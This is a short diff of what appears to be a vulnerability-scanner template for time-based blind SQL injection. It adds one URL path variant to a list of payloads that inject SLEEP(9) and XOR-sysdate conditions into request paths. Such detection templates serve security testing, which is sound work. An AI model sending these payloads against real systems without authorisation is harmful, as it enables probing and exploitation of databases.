@@ -13,6 +13,7 @@ requests:
     path:
       - "{{BaseURL}}/dont-work-sqli"
       - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/"
+      - "{{BaseURL}}?/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/"      
       - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z"      
       - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(9)))a)/"
       - "{{BaseURL}}/,(select * from (select(sleep(9)))a)/"
